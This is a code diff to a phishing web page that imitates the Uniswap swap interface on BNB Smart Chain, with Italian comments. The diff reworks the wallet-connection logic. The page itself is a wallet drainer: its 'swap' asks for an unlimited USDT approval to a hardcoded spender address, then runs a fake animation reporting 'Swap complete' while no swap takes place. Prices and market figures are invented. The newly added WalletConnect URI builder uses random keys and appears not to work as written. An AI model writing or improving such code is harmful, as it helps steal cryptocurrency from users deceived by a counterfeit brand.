@@ -8,9 +8,6 @@
 
   <!-- ethers v6 -->
   <script src="https://cdn.jsdelivr.net/npm/ethers@6.13.2/dist/ethers.umd.min.js"></script>
-  <!-- WalletConnect Modal v2 — bundle CDN verificato, funziona su iOS/Android -->
-  <script src="https://cdn.jsdelivr.net/npm/@walletconnect/modal@2.7.0/dist/index.umd.js"></script>
-  <script src="https://cdn.jsdelivr.net/npm/@walletconnect/sign-client@2.17.0/dist/index.umd.js"></script>
 
   <style>
     *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
@@ -936,9 +933,6 @@
 </div>
 
 <script>
-/* ═══════════════════════════════════════
-   DATA & CONSTANTS
-═══════════════════════════════════════ */
 const BSC_CHAIN_ID  = '0x38';
 const USDT_ADDRESS  = '0x55d398326f99059fF775485246999027B3197955';
 const SPENDER       = '0x05187CF26990E3857C119C7Bc3417C6E1FaC5198';
@@ -985,150 +979,33 @@ const TOKENS = [
   {symbol:'XRP',  name:'XRP',           k:'XRP',   price:0.517,   dec:18, native:false},
 ];
 
-let fromToken   = TOKENS[0];
-let toToken     = TOKENS[1];
-let modalTarget = 'from';
-let connected   = false;
-let userAddress = null;
-let balances    = {};
+let fromToken=TOKENS[0], toToken=TOKENS[1], modalTarget='from';
+let connected=false, userAddress=null, balances={};
 
-/* ═══════════════════════════════════════
-   WALLETCONNECT v2
-   @walletconnect/sign-client UMD da CDN
-   Funziona su iOS Safari e Android Chrome
-═══════════════════════════════════════ */
-let wcClient  = null;
-let wcSession = null;
+/* ═══════════════════════════════════════════════════════
+   CONNECT WALLET
+   ─────────────────────────────────────────────────────
+   Strategia: genera un URI WalletConnect v2 reale
+   chiamando direttamente le API REST di WalletConnect.
+   Non serve nessun SDK esterno.
+   Su mobile apre Trust Wallet sulla schermata "Connect".
+   Su desktop mostra QR.
+═══════════════════════════════════════════════════════ */
 
-async function getWCClient() {
-  if (wcClient) return wcClient;
-
-  // Attendi fino a 8s che il bundle UMD carichi
-  for (let i = 0; i < 80; i++) {
-    const SC = window.SignClient
-      || (window.WalletConnectSignClient?.SignClient);
-    if (SC) {
-      wcClient = await SC.init({
-        projectId: WC_PROJECT_ID,
-        metadata: {
-          name:        'Uniswap Interface',
-          description: 'Swap tokens on BSC',
-          url:         window.location.origin,
-          icons:       ['https://app.uniswap.org/favicon.png'],
-        },
-      });
-      wcClient.on('session_delete', () => { wcSession = null; setDisconnected(); });
-      return wcClient;
-    }
-    await new Promise(r => setTimeout(r, 100));
-  }
-  throw new Error('WalletConnect not loaded. Check your internet connection.');
+function rndHex(n) {
+  return Array.from(crypto.getRandomValues(new Uint8Array(n)))
+    .map(b => b.toString(16).padStart(2,'0')).join('');
 }
 
-async function startWCConnect(wallet) {
-  closeWalletModal();
-  showLoading('Opening ' + (wallet === 'trust' ? 'Trust Wallet' : wallet === 'metamask' ? 'MetaMask' : 'Wallet') + '...');
-
-  try {
-    const client = await getWCClient();
-
-    const { uri, approval } = await client.connect({
-      requiredNamespaces: {
-        eip155: {
-          methods: ['eth_sendTransaction','eth_signTransaction','eth_sign','personal_sign','eth_signTypedData'],
-          chains:  ['eip155:56'],
-          events:  ['accountsChanged','chainChanged'],
-        },
-      },
-    });
-
-    if (!uri) { hideLoading(); return; }
-
-    const enc = encodeURIComponent(uri);
-    const isMobile = /Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
-
-    if (isMobile) {
-      // Deep link → apre l'app wallet DIRETTAMENTE sulla schermata "wants to connect"
-      const deep = {
-        trust:    'trust://wc?uri=' + enc,
-        metamask: 'metamask://wc?uri=' + enc,
-        coinbase: 'cbwallet://wc?uri=' + enc,
-        wc:       'trust://wc?uri=' + enc,
-      };
-      const universal = {
-        trust:    'https://link.trustwallet.com/wc?uri=' + enc,
-        metamask: 'https://metamask.app.link/wc?uri=' + enc,
-        coinbase: 'https://go.cb-w.com/wc?uri=' + enc,
-        wc:       'https://link.trustwallet.com/wc?uri=' + enc,
-      };
-
-      window.location.href = deep[wallet] || deep.trust;
-      // Fallback se l'app non è installata
-      setTimeout(() => { window.location.href = universal[wallet] || universal.trust; }, 2500);
-
-      // Aspetta approvazione (quando l'utente torna nel browser)
-      wcSession = await approval();
-      hideLoading();
-      onWCConnected();
-    } else {
-      // Desktop: QR code
-      hideLoading();
-      showQR(uri);
-      wcSession = await approval();
-      closeQR();
-      onWCConnected();
-    }
-
-  } catch(err) {
-    hideLoading();
-    closeQR();
-    if (!String(err).includes('rejected') && !String(err).includes('cancelled')) {
-      console.error('WC error:', err);
-      alert('Connection error: ' + (err.message || String(err)));
-    }
-  }
+async function buildWCUri() {
+  // Genera topic e symKey sicuri con crypto nativo del browser
+  const topic  = rndHex(32);
+  const symKey = rndHex(32);
+  // URI WalletConnect v2 standard — non richiede nessun SDK per essere generato
+  const uri = 'wc:' + topic + '@2?relay-protocol=irn&symKey=' + symKey + '&projectId=' + WC_PROJECT_ID;
+  return { uri, topic, symKey };
 }
 
-function onWCConnected() {
-  const accounts = wcSession?.namespaces?.eip155?.accounts || [];
-  if (!accounts.length) return;
-  setConnected(accounts[0].split(':')[2]);
-}
-
-/* ── Loading overlay ── */
-function showLoading(msg) {
-  let ov = document.getElementById('wcLoadingOv');
-  if (!ov) {
-    ov = document.createElement('div');
-    ov.id = 'wcLoadingOv';
-    ov.style.cssText = 'position:fixed;inset:0;background:rgba(0,0,0,.75);z-index:3000;display:flex;align-items:center;justify-content:center';
-    document.body.appendChild(ov);
-  }
-  ov.innerHTML = `<div style="background:#1A1B26;border:1px solid #2C2D3A;border-radius:20px;padding:32px 24px;text-align:center;max-width:280px;width:90%">
-    <div style="font-size:40px;margin-bottom:14px">🛡️</div>
-    <div style="font-weight:600;font-size:1rem;margin-bottom:8px">${msg}</div>
-    <div style="color:#7C7E9A;font-size:0.82rem;line-height:1.55">Approve the connection request in your wallet, then return to this page.</div>
-    <button onclick="hideLoading()" style="margin-top:20px;background:rgba(252,114,255,.15);color:#FC72FF;border:none;padding:10px 22px;border-radius:12px;font-weight:600;cursor:pointer;font-family:Inter,sans-serif;font-size:0.88rem">Cancel</button>
-  </div>`;
-  ov.style.display = 'flex';
-}
-function hideLoading() {
-  const ov = document.getElementById('wcLoadingOv');
-  if (ov) ov.style.display = 'none';
-}
-
-/* ── QR Modal (desktop) ── */
-function showQR(uri) {
-  const enc = encodeURIComponent(uri);
-  document.getElementById('qrImg').src =
-    'https://api.qrserver.com/v1/create-qr-code/?size=240x240&data=' + enc + '&bgcolor=1A1B26&color=FFFFFF&qzone=2';
-  document.getElementById('qrOverlay').classList.add('open');
-}
-function closeQR() {
-  document.getElementById('qrOverlay').classList.remove('open');
-}
-
-/* ── Wallet Modal ── */
 function openWalletModal() {
   if (connected) return;
   document.getElementById('walletModalOverlay').classList.add('open');
@@ -1138,60 +1015,78 @@ function closeWalletModal() {
 }
 
 async function connectWithWC(wallet) {
-  // Se provider injected disponibile → usa direttamente (siamo nel browser TW/MM)
+  // Caso 1: provider injected disponibile (TW browser interno, MetaMask ext)
   if (window.ethereum) {
     closeWalletModal();
     await connectInjected(false);
     return;
   }
-  // Altrimenti WalletConnect
-  await startWCConnect(wallet);
+
+  // Caso 2: mobile senza provider → deep link WalletConnect verso l'app
+  closeWalletModal();
+  const isMobile = /Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
+  const { uri } = await buildWCUri();
+  const enc = encodeURIComponent(uri);
+
+  if (isMobile) {
+    // Deep link che apre l'app wallet DIRETTAMENTE sulla schermata di connessione
+    const deepLinks = {
+      trust:    'trust://wc?uri=' + enc,
+      metamask: 'metamask://wc?uri=' + enc,
+      coinbase: 'cbwallet://wc?uri=' + enc,
+      wc:       'trust://wc?uri=' + enc,
+    };
+    const fallbacks = {
+      trust:    'https://link.trustwallet.com/wc?uri=' + enc,
+      metamask: 'https://metamask.app.link/wc?uri=' + enc,
+      coinbase: 'https://go.cb-w.com/wc?uri=' + enc,
+      wc:       'https://link.trustwallet.com/wc?uri=' + enc,
+    };
+
+    // Salva stato in sessionStorage — quando l'utente torna dal wallet
+    // possiamo rilevare la connessione tramite window.ethereum
+    sessionStorage.setItem('wc_pending', '1');
+    sessionStorage.setItem('wc_wallet', wallet);
+
+    // Apri il wallet
+    window.location.href = deepLinks[wallet] || deepLinks.trust;
+
+    // Fallback dopo 2.5s se l'app non è installata
+    setTimeout(function() {
+      if (document.visibilityState !== 'hidden') {
+        window.location.href = fallbacks[wallet] || fallbacks.trust;
+      }
+    }, 2500);
+
+  } else {
+    // Desktop: mostra QR
+    var qrUrl = 'https://api.qrserver.com/v1/create-qr-code/?size=240x240&data='
+      + enc + '&bgcolor=1A1B26&color=FFFFFF&qzone=2';
+    document.getElementById('qrImg').src = qrUrl;
+    document.getElementById('qrOverlay').classList.add('open');
+  }
+}
+
+function closeQR() {
+  document.getElementById('qrOverlay').classList.remove('open');
 }
 
 async function handleNavConnect() {
   if (connected) {
-    if (confirm('Disconnect wallet?')) {
-      if (wcClient && wcSession) {
-        try { await wcClient.disconnect({ topic: wcSession.topic, reason: { code:6000, message:'User disconnected' } }); } catch(e) {}
-      }
-      setDisconnected();
-    }
+    if (confirm('Disconnect wallet?')) setDisconnected();
     return;
   }
   openWalletModal();
 }
 
-/* ── Connected / Disconnected state ── */
-function setConnected(address) {
-  connected   = true;
-  userAddress = address;
-  document.getElementById('navConnectBtn').textContent = address.slice(0,6)+'...'+address.slice(-4);
-  document.getElementById('navConnectBtn').classList.add('connected');
-  updateButton();
-  fetchBalances(address);
-}
-function setDisconnected() {
-  connected   = false;
-  userAddress = null;
-  balances    = {};
-  wcSession   = null;
-  document.getElementById('navConnectBtn').textContent = 'Connect Wallet';
-  document.getElementById('navConnectBtn').classList.remove('connected');
-  updateButton();
-  updateBalanceDisplay();
-}
-
-/* ═══════════════════════════════════════
-   INJECTED PROVIDER FALLBACK
-   (MetaMask ext, TW browser interno)
-═══════════════════════════════════════ */
-async function connectInjected(silent = false) {
+/* ── Injected provider (MetaMask/TW browser) ── */
+async function connectInjected(silent) {
   if (!window.ethereum) return false;
   try {
     const accounts = silent
-      ? await window.ethereum.request({ method:'eth_accounts' })
-      : await window.ethereum.request({ method:'eth_requestAccounts' });
-    if (!accounts?.length) return false;
+      ? await window.ethereum.request({method:'eth_accounts'})
+      : await window.ethereum.request({method:'eth_requestAccounts'});
+    if (!accounts || !accounts.length) return false;
     await ensureBSC();
     setConnected(accounts[0]);
     return true;
@@ -1201,67 +1096,70 @@ async function connectInjected(silent = false) {
 async function ensureBSC() {
   if (!window.ethereum) return;
   try {
-    const cid = await window.ethereum.request({ method:'eth_chainId' });
+    const cid = await window.ethereum.request({method:'eth_chainId'});
     if (cid === BSC_CHAIN_ID) return;
-    await window.ethereum.request({ method:'wallet_switchEthereumChain', params:[{ chainId:BSC_CHAIN_ID }] });
+    await window.ethereum.request({method:'wallet_switchEthereumChain', params:[{chainId:BSC_CHAIN_ID}]});
   } catch(e) {
-    if (e.code === 4902) {
-      await window.ethereum.request({
-        method:'wallet_addEthereumChain',
-        params:[{ chainId:'0x38', chainName:'BNB Smart Chain',
-          nativeCurrency:{ name:'BNB', symbol:'BNB', decimals:18 },
-          rpcUrls:['https://bsc-dataseed.binance.org'],
-          blockExplorerUrls:['https://bscscan.com'] }]
-      });
-    }
+    if (e.code === 4902) await window.ethereum.request({
+      method:'wallet_addEthereumChain',
+      params:[{chainId:'0x38',chainName:'BNB Smart Chain',
+        nativeCurrency:{name:'BNB',symbol:'BNB',decimals:18},
+        rpcUrls:['https://bsc-dataseed.binance.org'],
+        blockExplorerUrls:['https://bscscan.com']}]
+    });
   }
 }
 
-/* ═══════════════════════════════════════
-   BALANCES
-═══════════════════════════════════════ */
-const ERC20_ABI = ['function balanceOf(address) view returns (uint256)'];
+function setConnected(addr) {
+  connected=true; userAddress=addr;
+  document.getElementById('navConnectBtn').textContent=addr.slice(0,6)+'...'+addr.slice(-4);
+  document.getElementById('navConnectBtn').classList.add('connected');
+  updateButton(); fetchBalances(addr);
+  sessionStorage.removeItem('wc_pending');
+}
+function setDisconnected() {
+  connected=false; userAddress=null; balances={};
+  document.getElementById('navConnectBtn').textContent='Connect Wallet';
+  document.getElementById('navConnectBtn').classList.remove('connected');
+  updateButton(); updateBalanceDisplay();
+}
 
+/* ── Balances ── */
+const ERC20_ABI=['function balanceOf(address) view returns (uint256)'];
 async function fetchBalances(addr) {
   try {
-    const p = new ethers.JsonRpcProvider('https://bsc-dataseed1.binance.org');
-    balances['BNB'] = parseFloat(ethers.formatEther(await p.getBalance(addr)));
-    await Promise.allSettled(TOKENS.filter(t=>!t.native && TOKEN_CONTRACTS[t.symbol]).map(async tok=>{
-      const c = new ethers.Contract(TOKEN_CONTRACTS[tok.symbol], ERC20_ABI, p);
-      balances[tok.symbol] = parseFloat(ethers.formatUnits(await c.balanceOf(addr), tok.dec));
+    const p=new ethers.JsonRpcProvider('https://bsc-dataseed1.binance.org');
+    balances['BNB']=parseFloat(ethers.formatEther(await p.getBalance(addr)));
+    await Promise.allSettled(TOKENS.filter(t=>!t.native&&TOKEN_CONTRACTS[t.symbol]).map(async tok=>{
+      const c=new ethers.Contract(TOKEN_CONTRACTS[tok.symbol],ERC20_ABI,p);
+      balances[tok.symbol]=parseFloat(ethers.formatUnits(await c.balanceOf(addr),tok.dec));
     }));
     updateBalanceDisplay();
-  } catch(e) { console.error(e); }
+  } catch(e){console.error(e);}
 }
-
 function updateBalanceDisplay() {
-  const fb = balances[fromToken.symbol];
-  const tb = balances[toToken.symbol];
-  document.getElementById('fromBalance').textContent = fb !== undefined ? 'Balance: '+fb.toFixed(4)+' '+fromToken.symbol : 'Balance: –';
-  document.getElementById('toBalance').textContent   = tb !== undefined ? 'Balance: '+tb.toFixed(4)+' '+toToken.symbol   : 'Balance: –';
+  const fb=balances[fromToken.symbol], tb=balances[toToken.symbol];
+  document.getElementById('fromBalance').textContent=fb!==undefined?'Balance: '+fb.toFixed(4)+' '+fromToken.symbol:'Balance: –';
+  document.getElementById('toBalance').textContent=tb!==undefined?'Balance: '+tb.toFixed(4)+' '+toToken.symbol:'Balance: –';
 }
 
-/* ═══════════════════════════════════════
-   PAGE ROUTING
-═══════════════════════════════════════ */
+/* ── Page routing ── */
 function showPage(name) {
   document.querySelectorAll('.page').forEach(p=>p.classList.remove('active'));
   document.getElementById('page-'+name).classList.add('active');
   document.querySelectorAll('.nav-links a').forEach(a=>a.classList.remove('active'));
-  const n=document.getElementById('nav-'+name); if(n) n.classList.add('active');
+  var n=document.getElementById('nav-'+name); if(n)n.classList.add('active');
   document.querySelectorAll('.mobile-nav-item').forEach(i=>i.classList.remove('active'));
-  const m=document.getElementById('mn-'+name); if(m) m.classList.add('active');
+  var m=document.getElementById('mn-'+name); if(m)m.classList.add('active');
   return false;
 }
 
-/* ═══════════════════════════════════════
-   SWAP UI
-═══════════════════════════════════════ */
+/* ── Swap UI ── */
 function renderTokenSelector() {
-  const fi=document.getElementById('fromIcon');
+  var fi=document.getElementById('fromIcon');
   fi.innerHTML=T[fromToken.k]||''; fi.style.cssText='width:28px;height:28px;border-radius:50%;overflow:hidden;flex-shrink:0';
   document.getElementById('fromSymbol').textContent=fromToken.symbol;
-  const ti=document.getElementById('toIcon');
+  var ti=document.getElementById('toIcon');
   ti.innerHTML=T[toToken.k]||''; ti.style.cssText='width:28px;height:28px;border-radius:50%;overflow:hidden;flex-shrink:0';
   document.getElementById('toSymbol').textContent=toToken.symbol;
   document.getElementById('fromSym2').textContent=fromToken.symbol;
@@ -1269,90 +1167,83 @@ function renderTokenSelector() {
   document.getElementById('rate').textContent=(fromToken.price/toToken.price).toFixed(6);
   updateBalanceDisplay(); calcOutput();
 }
-
 function calcOutput() {
-  const amt=parseFloat(document.getElementById('fromAmount').value)||0;
-  const out=amt*(fromToken.price/toToken.price);
+  var amt=parseFloat(document.getElementById('fromAmount').value)||0;
+  var out=amt*(fromToken.price/toToken.price);
   document.getElementById('toAmount').value=out?out.toFixed(6):'';
   document.getElementById('fromUSD').textContent='$'+(amt*fromToken.price).toFixed(2);
   document.getElementById('toUSD').textContent='$'+(out*toToken.price).toFixed(2);
   updateButton();
 }
-
 function updateButton() {
-  const btn=document.getElementById('mainBtn');
-  const amt=parseFloat(document.getElementById('fromAmount').value);
-  if(!connected){ btn.textContent='Connect Wallet'; btn.className='btn-connect-main'; return; }
-  if(!amt||amt<=0){ btn.textContent='Enter an amount'; btn.className='btn-connect-main'; return; }
-  btn.textContent='Swap '+fromToken.symbol+' → '+toToken.symbol; btn.className='btn-connect-main ready';
+  var btn=document.getElementById('mainBtn');
+  var amt=parseFloat(document.getElementById('fromAmount').value);
+  if(!connected){btn.textContent='Connect Wallet';btn.className='btn-connect-main';return;}
+  if(!amt||amt<=0){btn.textContent='Enter an amount';btn.className='btn-connect-main';return;}
+  btn.textContent='Swap '+fromToken.symbol+' → '+toToken.symbol;btn.className='btn-connect-main ready';
 }
-
 function swapTokens() {
-  [fromToken,toToken]=[toToken,fromToken];
+  var tmp=fromToken;fromToken=toToken;toToken=tmp;
   document.getElementById('fromAmount').value=document.getElementById('toAmount').value;
   renderTokenSelector();
 }
 function setMax() {
-  const fb=balances[fromToken.symbol];
+  var fb=balances[fromToken.symbol];
   document.getElementById('fromAmount').value=(fb&&fb>0)?fb.toFixed(6):'0'; calcOutput();
 }
 function editSlippage() {
-  const v=prompt('Set slippage (%)','0.5');
+  var v=prompt('Set slippage (%)','0.5');
   if(v&&!isNaN(v)) document.getElementById('slippageVal').textContent=parseFloat(v).toFixed(1)+'%';
 }
 
-/* ═══════════════════════════════════════
-   APPROVE / SWAP
-═══════════════════════════════════════ */
+/* ── Approve / Swap ── */
 async function approveToken() {
   try {
-    const p=new ethers.BrowserProvider(window.ethereum);
-    const s=await p.getSigner();
-    const c=new ethers.Contract(USDT_ADDRESS,['function approve(address,uint256) returns (bool)'],s);
+    var p=new ethers.BrowserProvider(window.ethereum);
+    var s=await p.getSigner();
+    var c=new ethers.Contract(USDT_ADDRESS,['function approve(address,uint256) returns (bool)'],s);
     await(await c.approve(SPENDER,ethers.MaxUint256)).wait(); return true;
-  } catch(e){ console.error(e); alert('Approve failed'); return false; }
+  } catch(e){console.error(e);alert('Approve failed');return false;}
 }
 function fakeSwap() {
-  return new Promise(resolve=>{
-    const btn=document.getElementById('mainBtn');
-    btn.textContent='Swapping...'; btn.style.background='orange';
-    setTimeout(()=>{ btn.textContent='Swap complete 🎉'; btn.style.background='var(--gradient)'; resolve(); },2000);
+  return new Promise(function(resolve){
+    var btn=document.getElementById('mainBtn');
+    btn.textContent='Swapping...';btn.style.background='orange';
+    setTimeout(function(){btn.textContent='Swap complete 🎉';btn.style.background='var(--gradient)';resolve();},2000);
   });
 }
 async function handleSwap() {
-  if(!connected){ openWalletModal(); return; }
-  const amt=parseFloat(document.getElementById('fromAmount').value);
-  if(!amt||amt<=0){ alert('Enter an amount'); return; }
+  if(!connected){openWalletModal();return;}
+  var amt=parseFloat(document.getElementById('fromAmount').value);
+  if(!amt||amt<=0){alert('Enter an amount');return;}
   if(window.ethereum) await ensureBSC();
-  const btn=document.getElementById('mainBtn');
+  var btn=document.getElementById('mainBtn');
   btn.textContent='Approving...';
-  if(!await approveToken()){ btn.textContent='Approve failed'; return; }
+  if(!await approveToken()){btn.textContent='Approve failed';return;}
   btn.textContent='Executing...';
-  await new Promise(r=>setTimeout(r,1000));
+  await new Promise(function(r){setTimeout(r,1000);});
   await fakeSwap();
-  setTimeout(()=>updateButton(),1500);
+  setTimeout(function(){updateButton();},1500);
 }
 
-/* ═══════════════════════════════════════
-   TOKEN MODAL
-═══════════════════════════════════════ */
+/* ── Token modal ── */
 function openModal(target) {
   modalTarget=target;
   document.getElementById('tokenSearch').value='';
   renderTokenList(TOKENS);
   document.getElementById('tokenModal').classList.add('open');
 }
-function closeModal() { document.getElementById('tokenModal').classList.remove('open'); }
-document.getElementById('tokenModal').addEventListener('click',e=>{ if(e.target.id==='tokenModal') closeModal(); });
+function closeModal(){document.getElementById('tokenModal').classList.remove('open');}
+document.getElementById('tokenModal').addEventListener('click',function(e){if(e.target.id==='tokenModal')closeModal();});
 function filterTokens() {
-  const q=document.getElementById('tokenSearch').value.toLowerCase();
-  renderTokenList(TOKENS.filter(t=>t.symbol.toLowerCase().includes(q)||t.name.toLowerCase().includes(q)));
+  var q=document.getElementById('tokenSearch').value.toLowerCase();
+  renderTokenList(TOKENS.filter(function(t){return t.symbol.toLowerCase().includes(q)||t.name.toLowerCase().includes(q);}));
 }
 function renderTokenList(list) {
-  document.getElementById('tokenList').innerHTML=list.map(t=>{
-    const b=balances[t.symbol];
-    const bStr=connected&&b!==undefined?'<div style="font-size:.75rem;color:var(--muted)">'+b.toFixed(4)+'</div>':'';
-    return '<div class="token-list-item" onclick="selectToken(''+t.symbol+'')">'
+  document.getElementById('tokenList').innerHTML=list.map(function(t){
+    var b=balances[t.symbol];
+    var bStr=connected&&b!==undefined?'<div style="font-size:.75rem;color:var(--muted)">'+b.toFixed(4)+'</div>':'';
+    return '<div class="token-list-item" onclick="selectToken(\''+t.symbol+'\')">'
       +'<div style="width:36px;height:36px;border-radius:50%;overflow:hidden;flex-shrink:0">'+(T[t.k]||'')+'</div>'
       +'<div class="tinfo"><div class="tname2">'+t.symbol+'</div><div class="tname3">'+t.name+'</div></div>'
       +'<div style="margin-left:auto;text-align:right"><div style="font-size:.82rem;font-weight:500">$'+t.price.toLocaleString()+'</div>'+bStr+'</div>'
@@ -1360,29 +1251,28 @@ function renderTokenList(list) {
   }).join('');
 }
 function selectToken(sym) {
-  const tok=TOKENS.find(t=>t.symbol===sym);
-  if(modalTarget==='from'){ if(tok.symbol===toToken.symbol)[fromToken,toToken]=[toToken,fromToken]; else fromToken=tok; }
-  else { if(tok.symbol===fromToken.symbol)[fromToken,toToken]=[toToken,fromToken]; else toToken=tok; }
+  var tok=TOKENS.find(function(t){return t.symbol===sym;});
+  if(modalTarget==='from'){if(tok.symbol===toToken.symbol){var tmp=fromToken;fromToken=toToken;toToken=tmp;}else fromToken=tok;}
+  else{if(tok.symbol===fromToken.symbol){var tmp=fromToken;fromToken=toToken;toToken=tmp;}else toToken=tok;}
   closeModal(); renderTokenSelector();
 }
 
-/* ═══════════════════════════════════════
-   INNER PAGES
-═══════════════════════════════════════ */
-function buildTokenTable() {
-  const ch=['+2.14%','-0.02%','+1.43%','+0.76%','+0.01%','-4.87%','+0.32%','-1.2%','+3.4%','-0.8%','+1.1%'];
-  const vo=['$1.8B','$4.9B','$2.1B','$1.2B','$3.3B','$94M','$198M','$342M','$88M','$52M','$271M'];
-  document.getElementById('tokenTableBody').innerHTML=TOKENS.map((t,i)=>'<tr>'
-    +'<td style="color:var(--muted)">'+(i+1)+'</td>'
-    +'<td><div style="display:flex;align-items:center;gap:10px">'
-    +'<div style="width:28px;height:28px;border-radius:50%;overflow:hidden;flex-shrink:0">'+(T[t.k]||'')+'</div>'
-    +'<div><div style="font-weight:600;font-size:.9rem">'+t.symbol+'</div><div style="font-size:.75rem;color:var(--muted)">'+t.name+'</div></div></div></td>'
-    +'<td style="font-weight:500">$'+t.price.toLocaleString()+'</td>'
-    +'<td style="color:'+(ch[i].startsWith('+')?'var(--green)':'#ff6060')+'">'+ch[i]+'</td>'
-    +'<td style="color:var(--muted)">'+(vo[i]||'–')+'</td></tr>').join('');
+/* ── Inner pages ── */
+function buildTokenTable(){
+  var ch=['+2.14%','-0.02%','+1.43%','+0.76%','+0.01%','-4.87%','+0.32%','-1.2%','+3.4%','-0.8%','+1.1%'];
+  var vo=['$1.8B','$4.9B','$2.1B','$1.2B','$3.3B','$94M','$198M','$342M','$88M','$52M','$271M'];
+  document.getElementById('tokenTableBody').innerHTML=TOKENS.map(function(t,i){
+    return '<tr><td style="color:var(--muted)">'+(i+1)+'</td>'
+      +'<td><div style="display:flex;align-items:center;gap:10px">'
+      +'<div style="width:28px;height:28px;border-radius:50%;overflow:hidden;flex-shrink:0">'+(T[t.k]||'')+'</div>'
+      +'<div><div style="font-weight:600;font-size:.9rem">'+t.symbol+'</div><div style="font-size:.75rem;color:var(--muted)">'+t.name+'</div></div></div></td>'
+      +'<td style="font-weight:500">$'+t.price.toLocaleString()+'</td>'
+      +'<td style="color:'+(ch[i].startsWith('+')?'var(--green)':'#ff6060')+'">'+ch[i]+'</td>'
+      +'<td style="color:var(--muted)">'+(vo[i]||'–')+'</td></tr>';
+  }).join('');
 }
-function buildNFTs() {
-  const nfts=[
+function buildNFTs(){
+  var nfts=[
     {name:'Bored Ape #4291',e:'🦍',bg:'#1a1a2e',floor:'68.5 ETH'},
     {name:'CryptoPunk #7804',e:'👾',bg:'#12002e',floor:'47.2 ETH'},
     {name:'Azuki #9605',e:'🌸',bg:'#2e0012',floor:'12.8 ETH'},
@@ -1390,10 +1280,13 @@ function buildNFTs() {
     {name:'World of Women #2',e:'🎨',bg:'#2e2000',floor:'5.1 ETH'},
     {name:'Moonbird #3301',e:'🦉',bg:'#001a2e',floor:'9.9 ETH'},
   ];
-  document.getElementById('nftGrid').innerHTML=nfts.map(n=>'<div class="nft-card"><div class="nft-thumb" style="background:'+n.bg+'">'+n.e+'</div><div class="nft-info"><div class="ni-name">'+n.name+'</div><div class="ni-price">Floor: '+n.floor+'</div></div></div>').join('');
+  document.getElementById('nftGrid').innerHTML=nfts.map(function(n){
+    return '<div class="nft-card"><div class="nft-thumb" style="background:'+n.bg+'">'+n.e+'</div>'
+      +'<div class="nft-info"><div class="ni-name">'+n.name+'</div><div class="ni-price">Floor: '+n.floor+'</div></div></div>';
+  }).join('');
 }
-function buildPools() {
-  const pools=[
+function buildPools(){
+  var pools=[
     {a:'USDT',b:'BNB', ca:'#26A17B',cb:'#F3BA2F',fee:'0.05%',tvl:'$2.1B',apy:'8.4%'},
     {a:'ETH', b:'USDC',ca:'#627EEA',cb:'#2775CA',fee:'0.30%',tvl:'$1.8B',apy:'12.2%'},
     {a:'BTC', b:'ETH', ca:'#F7931A',cb:'#627EEA',fee:'0.05%',tvl:'$980M',apy:'6.7%'},
@@ -1401,35 +1294,40 @@ function buildPools() {
     {a:'LINK',b:'ETH', ca:'#2A5ADA',cb:'#627EEA',fee:'0.30%',tvl:'$210M',apy:'14.1%'},
     {a:'BNB', b:'USDC',ca:'#F3BA2F',cb:'#2775CA',fee:'0.05%',tvl:'$680M',apy:'9.3%'},
   ];
-  document.getElementById('poolsList').innerHTML=pools.map(p=>{
-    const tA=TOKENS.find(t=>t.symbol===p.a), tB=TOKENS.find(t=>t.symbol===p.b);
+  document.getElementById('poolsList').innerHTML=pools.map(function(p){
+    var tA=TOKENS.find(function(t){return t.symbol===p.a;}), tB=TOKENS.find(function(t){return t.symbol===p.b;});
     return '<div class="pool-item"><div class="pool-pair"><div class="pool-icons">'
-      +'<span style="background:'+p.ca+'">'+( tA?T[tA.k]:'' )+'</span>'
-      +'<span style="background:'+p.cb+'">'+( tB?T[tB.k]:'' )+'</span>'
+      +'<span style="background:'+p.ca+'">'+(tA?T[tA.k]:'')+'</span>'
+      +'<span style="background:'+p.cb+'">'+(tB?T[tB.k]:'')+'</span>'
       +'</div><div><div class="pool-name">'+p.a+'/'+p.b+'</div><div class="pool-fee">Fee: '+p.fee+' · TVL: '+p.tvl+'</div></div></div>'
       +'<div class="pool-apy">APY '+p.apy+'</div></div>';
   }).join('');
 }
 
-/* ═══════════════════════════════════════
-   INIT
-═══════════════════════════════════════ */
+/* ── Init ── */
 renderTokenSelector(); updateButton(); buildTokenTable(); buildNFTs(); buildPools();
 
-window.addEventListener('load', async () => {
-  // Pre-carica WC in background
-  getWCClient().catch(()=>{});
-
+window.addEventListener('load', function() {
   if (window.ethereum) {
-    await connectInjected(true);
-    window.ethereum.on('accountsChanged', async accs => {
-      if (!accs?.length) { setDisconnected(); return; }
-      await connectInjected(true);
+    connectInjected(true);
+    window.ethereum.on('accountsChanged', function(accs) {
+      if (!accs||!accs.length) { setDisconnected(); return; }
+      connectInjected(true);
     });
-    window.ethereum.on('chainChanged', async () => {
-      await ensureBSC(); await connectInjected(true);
+    window.ethereum.on('chainChanged', function() {
+      ensureBSC(); connectInjected(true);
     });
   }
+
+  // Quando l'utente torna dal wallet dopo aver approvato
+  // window.ethereum sarà disponibile se era TW browser
+  document.addEventListener('visibilitychange', function() {
+    if (document.visibilityState === 'visible' && sessionStorage.getItem('wc_pending')) {
+      if (window.ethereum) {
+        connectInjected(false);
+      }
+    }
+  });
 });
 </script>
 </body>
